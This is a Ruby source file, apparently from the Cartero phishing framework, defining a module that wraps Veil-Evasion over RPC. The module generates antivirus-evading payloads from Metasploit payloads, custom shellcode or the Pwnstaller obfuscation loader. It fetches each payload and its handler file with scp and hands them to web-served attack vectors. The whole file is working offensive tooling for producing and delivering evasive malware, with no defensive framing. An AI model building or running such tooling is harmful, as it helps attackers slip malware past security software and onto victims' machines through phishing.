require 'command_line_reporter'
module Cartero
module Payloads
class VeilEvasion < ::Cartero::Payload
  include CommandLineReporter
  def initialize
    super do |opts|

      opts.on("-W", "--webserver [WEBSERVER_FOLDER]", String,
        "Sets the sinatra WebServer full path for payload creation") do |path|
        @options.path = path
        app = path.split("/")[-1]
        @options.customwebserver = path + "/" + app + ".rb"
        @options.views = path + "/views"
        @options.public_folder = path + "/static"
      end

      opts.on("-T", "--attack-type [ATTACK]", String,
        "Cartero attack type") do |p|
        @options.attack_type = p
      end

      opts.on("-R", "--request-path [PATH]", String,
        "Cartero webserver custom request path for attack.") do |p|
        @options.request_path = p
      end

      opts.separator ""
      opts.separator "Veil options:"

      opts.on("-p", "--payload [PAYLOAD]", String,
        "Veil-Evasion payload to generate") do |p|
        @options.payload = p
      end

      # TODO: Finish implementation for --options. Currently not implemented.
      opts.on("-c", "--options [OPTIONS=value OPTIONS=value]", String,
        "Options for payload") do |options|
        @options.options = options
      end

      opts.on("--msfpayload [MSF_PAYLOAD]", String,
        "Sets msfpayload") do |payload|
        @options.msfpayload = payload
      end

      opts.on("--msfoptions [MSF_OPTIONS]", String,
        "Sets msfoptions") do |opt|
        @options.msfoptions = opt
      end

      opts.on("-S","--custshell [\\x00]", String,
        "Custom shellcode string to use") do |s|
        @options.customshell = s
      end

      opts.on("-o","--output [BASE_NAME]", String,
        "output base name") do |s|
        @options.customshell = s
      end

      opts.on("--pwnstaller", "Use the Pwnstaller obfuscation loader") do
        @options.pwnstaller = true
      end

      opts.on("--list-payloads", String,
        "List Veil-Evasion payloads") do
        @options.command = "list_payloads"
      end

      opts.on("--payload-options [PAYLOAD]", String,
        "List Requirements for specific payload") do |payload|
        @options.command = "payload_options"
        @options.payload_options = payload
      end

      opts.separator ""
      opts.separator "Veil RPC options:"
      opts.on("--start-veil-rpc", String,
        "start Veil-Evasion RPC client") do
        @options.command = "start_veil"
      end

      opts.on("--stop-veil-rpc", String,
        "Stop Veil-Evasion RPC client") do
        @options.command = "stop_veil"
      end
    end
  end
  attr_accessor :path
  attr_accessor :payload
  attr_accessor :options
  attr_accessor :msfpayload
  attr_accessor :msfoptions
  attr_accessor :customshell
  attr_accessor :output
  attr_accessor :pwnstaller
  attr_accessor :payload_options
  attr_accessor :command
  attr_accessor :host
  attr_accessor :port
  attr_accessor :webserver
  attr_accessor :attack_type
  attr_accessor :request_path

  def setup
    if @options.payload.nil? && !@options.list_payloads.nil? && !@options.payload_options.nil?
      raise StandardError, "A payload [--payload] must be provided"
    end

    # Only if we are not running a basic command :-)
    if @options.command.nil?
      # Setting Default / Custom Sinatra Server.
      if @options.customwebserver.nil?
        puts "Payloads & handlers will be saved to current path"
      else
        @path = @options.path
        if File.exist?(File.expand_path(@options.customwebserver))
          # Load library from file.
          load "#{File.expand_path(@options.customwebserver)}"
          # It is key that the name of the file reflect an uncamelize version of the library.
          # i.e. test_web_server.rb should be class TestWebServer
          @webserver = Module.const_get(File.basename(@options.customwebserver).split(".")[0..-2].join(".").camelize)
        else
          raise StandardError, "Custom WebServer file does not exists."
        end
      end
    end


    @payload 			= @options.payload
    @msfpayload 	= @options.msfpayload
    @msfoptions 	= @options.msfoptions
    @customshell 	= @options.customshell
    @output 			= @options.output || "cartero"
    @host					= ::Cartero::GlobalConfig["veilEvasion"]["host"] || "localhost"
    @port 				= ::Cartero::GlobalConfig["veilEvasion"]["port"] || "4242"
    @command 			= @options.command
    @payload_options = @options.payload_options
    @attack_type 	= @options.attack_type
    @request_path = @options.request_path
    @path 				= @options.path

    #initialize Veil Client
    require 'rjr/nodes/tcp'
    @client = RJR::Nodes::TCP.new :node_id => "client", :host => host, :port => port.to_s
  end

  def run
    if command
      case command
      when "list_payloads"
        puts "Veil-Evasion Payloads on #{host}:#{port} Version #{veil_client("version")}"
        display_payloads veil_client("payloads")
        exit
      when "payload_options"
        display_payloads_options veil_client("payload_options", payload_options)
        exit
      when "start_veil"
        puts "Starting Veil-Evasion RPC Server"
        ssh = "ssh #{Cartero::GlobalConfig["veilEvasion"]["ssh_user"]}@#{host}" if ::Cartero::GlobalConfig["veilEvasion"]["ssh"]
        system("#{ssh} #{Cartero::GlobalConfig["veilEvasion"]["path"] || "Veil-Evasion.py" } --rpc > /dev/null &")
      when "stop_veil"
        puts "Stoping Veil-Evasion RPC Server"
        @client.notify "jsonrpc://#{host}:#{port}", "shutdown"
        @client.notify "jsonrpc://#{host}:#{port}", "shutdown"
      else
        puts "Should not be here :-)"
      end
    end

    if payload
      args = ["payload=#{payload}", "outputbase=#{output}","overwrite=true"] + msfoptions.split(" ")
      remote_payload = veil_client("generate", *args)
      remote_handler = remote_payload.split("/")[0..-3].join("/") + "/handlers/" + output + "_handler.rc"

      if path
        Dir.mkdir path + "/payload" unless File.directory? path + "/payload"
        local_payload_name = path  + "/payload/" + remote_payload.split("/")[-1]
        local_handler_name = path  + "/payload/#{output}_handler.rc"
      else
        local_payload_name = remote_payload.split("/")[-1]
        local_handler_name = "#{output}_handler.rc"
      end

      if ::Cartero::GlobalConfig["veilEvasion"]["ssh"]
        base = "scp #{Cartero::GlobalConfig["veilEvasion"]["ssh_user"]}@#{host}:"
        puts "Downloading and saving payload to #{local_payload_name}"
        system base + "#{remote_payload} #{local_payload_name}"
        puts "Downloading and saving handler to #{local_handler_name}"
        system base + "#{remote_handler} #{local_handler_name}"
      else
        puts "Moving payload to #{local_payload_name}"
        system "mv #{remote_payload} #{local_payload_name}"
        puts "Moving handler to #{local_handler_name}"
        system "mv #{remote_handler} #{local_handler_name}"
      end
    end
    if attack_type
      require 'cartero/attack_vectors'
      ::Cartero::AttackVectors.new(@options, local_payload_name)
    end
  end

  private
  def veil_client(method, *params)
    @client.invoke "jsonrpc://#{host}:#{port}", method, *params
  end

  def display_payloads_options(c)
    return if c.empty?
    table() do
      row(:color => 'red', :header => true, :bold => true) do
        column('NAME', 			:width => 20)
        column('DEFAULT VALUE',:width => 15)
        column('DESCRIPTION',:width => 50)
      end
      c.each do |p|
        row() do
          column(p[0], :color => "blue")
          column(p[1] == "" ? "--" : p[1])
          column(p[2])
        end
      end
    end
  end

  def display_payloads(c)
    return if c.empty?
    table() do
      row(:color => 'red', :header => true, :bold => true) do
        column('ID', 			:width => 3)
        column('PAYLOAD',:width => 50)
      end
      c.each_with_index do |p,idx|
        row() do
          column(idx + 1)
          column(p, :color => "blue")
        end
      end
    end
  end
end
end
end
